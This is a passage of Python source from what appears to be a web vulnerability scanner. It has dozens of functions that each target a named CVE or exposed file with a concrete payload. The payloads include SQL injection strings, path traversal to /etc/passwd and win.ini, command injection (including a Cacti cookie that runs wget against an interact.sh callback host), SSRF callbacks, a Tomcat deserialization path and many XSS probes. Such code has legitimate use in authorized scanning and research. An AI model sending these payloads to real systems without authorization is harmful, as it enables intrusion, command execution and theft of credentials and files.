  severity = "P4"
  vulnDsc = "Ruby-on-Rails Database Configuration Exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/config/database.yml']
  redirAllow = False
  statusF = 200
  textF = 'database:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'adapter:' in z.text and 'production:' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# robomongo-credential
def attMOD137(progScope):
  myKey = "10f2155fb720846fd11c83e04d426e51"
  vulnCat = "Exposure"
  vulnName = "Expo137"
  severity = "P2"
  vulnDsc = "MongoDB credential disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/db/robomongo.json','/robomongo.json']
  redirAllow = False
  statusF = 200
  textF = 'databaseName'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'userName' in z.text and 'userPassword' in z.text and 'serverHost' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# samba-config
def attMOD138(progScope):
  myKey = "013551a92ca0542c44cf5c2823033946"
  vulnCat = "Exposure"
  vulnName = "Expo138"
  severity = "P4"
  vulnDsc = "Samba config file disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/smb.conf']
  redirAllow = False
  statusF = 200
  textF = 'configuration file'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'samba' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# dir-listing
def attMOD139(progScope):
  myKey = "2392e6e8e900ca742635a35ffd06f9c6"
  vulnCat = "Exposure"
  vulnName = "dir-listing"
  severity = "P4"
  vulnDsc = "Directory listing enabled"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/']
  redirAllow = False
  statusF = 200
  textF = 'Index of /'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text or 'Last modified</a>' in z.text or '[To Parent Directory]' in z.text or 'Directory: /' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-9757
def attMOD140(progScope):
  myKey = "96e1c9e77fac1c1d8d6b2145dbce6957"
  vulnCat = "Template Injection"
  vulnName = "CVE-2020-9757"
  severity = "P2"
  vulnDsc = "The SEOmatic component before 3.3.0 for Craft CMS allows Server-Side Template Injection"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/actions/seomatic/meta-container/meta-link-container/?uri={{228*\'98\'}}','/actions/seomatic/meta-container/all-meta-containers?uri={{228*\'98\'}}']
  redirAllow = False
  statusF = 200
  textF = 'canonical'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'MetaLinkContainer' in z.text and '22344' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-9496
def attMOD141(progScope):
  myKey = "00ef55dd85d2c3df56a8eb35a20a6a80"
  vulnCat = "Java Deserialization"
  vulnName = "CVE-2020-9496"
  severity = "P3"
  vulnDsc = "XML-RPC request are vulnerable to unsafe deserialization and Cross-Site Scripting issues"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = "POST"
  postData = """<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value>dwisiswant0</value></param></params></methodCall>"""
  urlList = ['/webtools/control/xmlrpc']
  redirAllow = False
  statusF = 200
  textF = 'No such service [ProjectDiscovery]'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'faultString' in z.text and 'methodResponse' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-9484
def attMOD142(progScope):
  myKey = "39bfd0a3024962be075bbe74d7bbc76f"
  vulnCat = "RCE"
  vulnName = "CVE-2020-9484"
  severity = "P2"
  vulnDsc = "Apache Tomcat RCE by deserialization"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'JSESSIONID':'../../../../../usr/local/tomcat/groovy'}
  reqMethod = ""
  postData = ""
  urlList = ['/index.jsp']
  redirAllow = False
  statusF = 500
  textF = 'Exception'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'ObjectInputStream' in z.text and 'PersistentManagerBase' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-9483
def attMOD143(progScope):
  myKey = "2a07637632ae423b576a0b0e66a1fb23"
  vulnCat = "SQLi"
  vulnName = "CVE-2020-9483"
  severity = "P2"
  vulnDsc = "the metadata query through GraphQL protocol, there is a SQL injection"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Content-Type': 'application/json'}
  reqMethod = "POST"
  postData = """{"query":"query SQLi($d: Duration!){globalP99:getLinearIntValues(metric: {name:"all_p99",id:"') UNION SELECT 1,CONCAT('~','9999999999','~')-- ",}, duration: $d){values{value}}}","variables":{"d":{"start":"2021-11-11","end":"2021-11-12","step":"DAY"}}}"""
  urlList = ['/graphql']
  redirAllow = False
  statusF = 200
  textF = "UNION SELECT 1,CONCAT('~','9999999999','~')--"
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'Exception while fetching data' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-9425
def attMOD144(progScope):
  myKey = "c2329f75d9d6709b343800184d9863b8"
  vulnCat = "InfoDisclo"
  vulnName = "CVE-2020-9425"
  severity = "P2"
  vulnDsc = "rConfig Unauthenticated Sensitive Information Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/settings.php']
  redirAllow = False
  statusF = 200
  textF = 'defaultNodeUsername'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'defaultNodePassword' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-9402
def attMOD145(progScope):
  myKey = "5554ef55bf9344642b8fd49844157b48"
  vulnCat = "SQLi"
  vulnName = "CVE-2020-9402"
  severity = "P2"
  vulnDsc = "Django framework suffers from a SQL injection vulnerability"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual)%20is%20null%20%20OR%20(1%2B1']
  redirAllow = False
  statusF = 200
  textF = 'DatabaseError at'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'ORA-29257:' in z.text and 'ORA-06512:' in z.text and 'Request Method:' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-9344
def attMOD146(progScope):
  myKey = "71871a5dfcd6768e436c616312f3950d"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-9344"
  severity = "P3"
  vulnDsc = "Jira Subversion ALM for enterprise XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/plugins/servlet/svnwebclient/changedResource.jsp?url=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E','/plugins/servlet/svnwebclient/commitGraph.jsp?%27)%3Balert(%22XSS','/plugins/servlet/svnwebclient/commitGraph.jsp?url=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E','/plugins/servlet/svnwebclient/error.jsp?errormessage=%27%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&description=test','/plugins/servlet/svnwebclient/statsItem.jsp?url=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '<script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-9315
def attMOD147(progScope):
  myKey = "04025e5dee22640014ef15208df8bb76"
  vulnCat = "AuthBypass"
  vulnName = "CVE-2020-9315"
  severity = "P2"
  vulnDsc = "Oracle iPlanet Improper Authorization"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/admingui/version/serverTasksGeneral?serverTasksGeneral.GeneralWebserverTabs.TabHref=2','/admingui/version/serverConfigurationsGeneral?serverConfigurationsGeneral.GeneralWebserverTabs.TabHref=4']
  redirAllow = False
  statusF = 200
  textF = 'Admin Console'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text or 'serverConfigurationsGeneral' in z.text and 'serverCertificatesGeneral' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-9036
def attMOD148(progScope):
  myKey = "b962e48ee0f02058bd90aef20ac72300"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-9036"
  severity = "P3"
  vulnDsc = "Jeedom framework allows execution of javascript code injected by the attackers"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/index.php?v=d&p=%22;alert(document.domain);%22']
  redirAllow = False
  statusF = 200
  textF = '<script>document.title = "";alert(document.domain);" - Jeedom"</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-8982
def attMOD149(progScope):
  myKey = "e854941f9a9401738e6cb61423452f12"
  vulnCat = "LFI"
  vulnName = "CVE-2020-8982"
  severity = "P2"
  vulnDsc = "Citrix ShareFile StorageZones Unauthenticated Arbitrary File Read"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/XmlPeek.aspx?dt=\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini&x=/validate.ashx?requri']
  redirAllow = False
  statusF = 200
  textF = 'bit app support'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'fonts' in z.text and 'extensions' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-8813
def attMOD150(progScope):
  myKey = "f8b8291281951554273756985eb1c958"
  vulnCat = "RCE"
  vulnName = "CVE-2020-8813"
  severity = "P2"
  vulnDsc = "Cacti V1.2 - Remote code execution"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Cookie': 'Cacti=%3Bwget%20http%3A//0000nlm6c0j53v2s668g61398133715me.interact.sh'}
  reqMethod = ""
  postData = ""
  urlList = ['/graph_realtime.php?action=init']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-8771
def attMOD151(progScope):
  myKey = "1aa1c0fde77394079fdd6a19871a850e"
  vulnCat = "AuthBypass"
  vulnName = "CVE-2020-8771"
  severity = "P1"
  vulnDsc = "WordPress WP Time Capsule Authentication Bypass"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Connection': 'close',
        'Accept': '*/*'}
  reqMethod = "POST"
  postData = """IWP_JSON_PREFIX"""
  urlList = ['/','/wp-admin/index.php']
  redirAllow = False
  statusF = 200
  textF = '<div id="adminmenumain" role="navigation" aria-label="Main menu">'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '<h1>Dashboard</h1>' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-8641
def attMOD152(progScope):
  myKey = "9dc6b4a4999510efbba9f39766416512"
  vulnCat = "LFI"
  vulnName = "CVE-2020-8641"
  severity = "P2"
  vulnDsc = "Lotus Core CMS 1.0.1 - Local File Inclusion"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/index.php?page_slug=../../../../../etc/passwd%00']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-8515
def attMOD153(progScope):
  myKey = "014e744bcfb1cc5f773a963b15952a06"
  vulnCat = "RCE"
  vulnName = "CVE-2020-8515"
  severity = "P1"
  vulnDsc = "DrayTek pre-auth RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = "POST"
  postData = """action=login&keyPath=%27%0A%2fbin%2fcat${IFS}%2fetc%2fpasswd%0A%27&loginUser=a&loginPwd=a"""
  urlList = ['/cgi-bin/mainfunction.cgi']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-8512
def attMOD154(progScope):
  myKey = "f062c0892923baf21691cabf603c3800"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-8512"
  severity = "P3"
  vulnDsc = "In IceWarp Webmail Server through 11.4.4.1, there is XSS in the /webmail/ color parameter."
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/webmail/?color=%22%3E%3Csvg/onload=alert(document.domain)%3E%22']
  redirAllow = False
  statusF = 200
  textF = '<svg/onload=alert(document.domain)>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-8209
def attMOD155(progScope):
  myKey = "626de13ede59c7c5c0e34c9c794a138c"
  vulnCat = "PathTraversal"
  vulnName = "CVE-2020-8209"
  severity = "P2"
  vulnDsc = "Citrix XenMobile Path Traversal"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-8194
def attMOD156(progScope):
  myKey = "2d3606c2b8d4dfdfa9b6c54e65ad1626"
  vulnCat = "RCE"
  vulnName = "CVE-2020-8194"
  severity = "P3"
  vulnDsc = "Citrix ADC & NetScaler Gateway Reflected Code Injection"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Cookie': 'startupapp=st'}
  reqMethod = ""
  postData = ""
  urlList = ['/menu/guiw?nsbrand=1&protocol=nonexistent.1337">&id=3&nsvpx=phpinfo']
  redirAllow = False
  statusF = 200
  textF = '<jnlp codebase="nonexistent.1337">'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-8191
def attMOD157(progScope):
  myKey = "31d5b767297578de3015d822446d932b"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-8191"
  severity = "P3"
  vulnDsc = "Citrix ADC & NetScaler Gateway Reflected XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Content-Type': 'application/x-www-form-urlencoded'
        ,'X-NITRO-USER': 'xpyZxwy6'}
  reqMethod = "POST"
  postData = """sid=254&pe=1,2,3,4,5&appname=%0a</title><script>alert(31337)</script>&au=1&username=nsroot"""
  urlList = ['/menu/stapp']
  redirAllow = False
  statusF = 200
  textF = '</title><script>alert(31337)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-8163
def attMOD158(progScope):
  myKey = "15de189b14fc85d5605dbd0dde550658"
  vulnCat = "RCE"
  vulnName = "CVE-2020-8163"
  severity = "P2"
  vulnDsc = "Potential Remote Code Execution on Rails"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-7961
def attMOD159(progScope):
  myKey = "985bfa82295980ed03ff3f57a6a35f00"
  vulnCat = "RCE"
  vulnName = "CVE-2020-7961"
  severity = "P1"
  vulnDsc = "Liferay Portal Unauthenticated RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Content-Type': 'application/x-www-form-urlencoded',
                   'cmd2':'systeminfo'}
  reqMethod = "POST"
  postData = """cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=nuclei&formDate=1597704739243&tableId=1&name=A&type=1&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource=%7B%22userOverridesAsString%22%3A%22HexAsciiSerializedMap
  urlList = ['/api/jsonws/invoke']
  redirAllow = False
  statusF = 200
  textF = 'OS Name:.*Microsoft Windows'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-7796
def attMOD160(progScope):
  myKey = "cac23fe9797a7ff2271b3ec1cf480b16"
  vulnCat = "SSRF"
  vulnName = "CVE-2020-7796"
  severity = "P1"
  vulnDsc = "Zimbra Collaboration Suite (ZCS) - SSRF"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/zimlet/com_zimbra_webex/httpPost.jsp?companyId=http://%230000nlm6c0j53v2s668g61398133715me.interact.sh/']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-7318
def attMOD161(progScope):
  myKey = "94934ba9a6c61ff9d3bc06020a66abcf"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-7318"
  severity = "P3"
  vulnDsc = "McAfee ePolicy Orchestrator Reflected XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Connection': 'close'}
  reqMethod = ""
  postData = ""
  urlList = ['/PolicyMgmt/policyDetailsCard.do?poID=19&typeID=3&prodID=%27%22%3E%3Csvg%2fonload%3dalert(document.domain)%3E']
  redirAllow = False
  statusF = 200
  textF = '\'"><svg/onload=alert(document.domain)>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-6308
def attMOD162(progScope):
  myKey = "3b8a4ece3d9dde5e2802c5d3bdacfa9d"
  vulnCat = "SSRF"
  vulnName = "CVE-2020-6308"
  severity = "P3"
  vulnDsc = "Unauthenticated Blind SSRF in SAP"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = "POST"
  postData = """aps=http://0000nlm6c0j53v2s668g61398133715me.interact.sh/&usr=admin&pwd=admin&aut=secEnterprise&main_page=ie.jsp&new_pass_page=newpwdform.jsp&exit_page=logonform.jsp"""
  urlList = ['/AdminTools/querybuilder/logon?framework=']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-6171
def attMOD163(progScope):
  myKey = "c6dfa03fa2c257c74d015fcc8827b56b"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-6171"
  severity = "P3"
  vulnDsc = "CLink Office v2 XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1']
  redirAllow = False
  statusF = 200
  textF = '"></script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-5902
def attMOD164(progScope):
  myKey = "a9b4513cac80545551940cdd8992c0b6"
  vulnCat = "LFI"
  vulnName = "CVE-2020-5902"
  severity = "P1"
  vulnDsc = "F5 BIG-IP TMUI RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd','/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release','/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license','/hsqldb%0a']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text or 'BIG-IP release ' in z.text or 'HSQL Database Engine Servlet' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-5847
def attMOD165(progScope):
  myKey = "99228986bbb18675daaae96c50c1be82"
  vulnCat = "RCE"
  vulnName = "CVE-2020-5847"
  severity = "P1"
  vulnDsc = "UnRaid Remote Code Execution"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/webGui/images/green-on.png/?path=x&site[x][text]=%3C?php%20phpinfo();%20?%3E']
  redirAllow = False
  statusF = 200
  textF = 'PHP Extension'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'PHP Version' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-36289
def attMOD166(progScope):
  myKey = "2b533fba7cbe0225cc20c550e3249565"
  vulnCat = "UserEnum"
  vulnName = "CVE-2020-36289"
  severity = "P3"
  vulnDsc = "Dairy Farm Shop Management System - SQL Injection"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin','/jira/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin']
  redirAllow = False
  statusF = 200
  textF = 'rel=\"admin\"'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-36112
def attMOD167(progScope):
  myKey = "6810d94b43570845cfe1fc086a29e4f4"
  vulnCat = "SQLi"
  vulnName = "CVE-2020-36112"
  severity = "P1"
  vulnDsc = "CSE Bookstore 1.0 SQL Injection"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ["/ebook/bookPerPub.php?pubid=4'"]
  redirAllow = False
  statusF = 200
  textF = 'get book price failed! You have an error in your SQL syntax'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text or 'Can\'t retrieve data You have an error in your SQL syntax' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-35489
def attMOD168(progScope):
  myKey = "04f313cfa0af6a556c5a1a2df19523fd"
  vulnCat = "FileUpload"
  vulnName = "CVE-2020-35489"
  severity = "P1"
  vulnDsc = "WordPress Contact Form 7 Plugin - Unrestricted File Upload"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/contact-form-7/readme.txt']
  redirAllow = False
  statusF = 200
  textF = 'Contact Form 7'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '== Changelog =="' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-3187
def attMOD169(progScope):
  myKey = "24dcbee5c2806de2f4b00e66cd287b71"
  vulnCat = "Traversal"
  vulnName = "CVE-2020-3187"
  severity = "P1"
  vulnDsc = "A vulnerability in the web services interface of Cisco Adaptive Security Appliance (ASA)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/+CSCOE+/session_password.html']
  redirAllow = False
  statusF = 200
  textF = 'webvpn'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-29453
def attMOD170(progScope):
  myKey = "4a5ed8c58e644e373ac14f7244f20208"
  vulnCat = "FileRead"
  vulnName = "CVE-2020-29453"
  severity = "P3"
  vulnDsc = "Pre-Auth Limited Arbitrary File Read in Jira Server"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/s/iput/_/%2e/WEB-INF/classes/META-INF/maven/com.atlassian.jira/jira-core/pom.xml','/s/iput/_/%2e/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml']
  redirAllow = False
  statusF = 200
  textF = '<groupId>com.atlassian.jira</groupId>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-29395
def attMOD171(progScope):
  myKey = "1a53b8ff74333c5a6394a8d632745c2e"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-29395"
  severity = "P3"
  vulnDsc = "Wordpress Plugin EventON Calendar 3.0.5 - Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/addons/?q=%3Csvg%2Fonload%3Dalert(1)%3E']
  redirAllow = False
  statusF = 200
  textF = '<svg/onload=alert(1)>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-29227
def attMOD172(progScope):
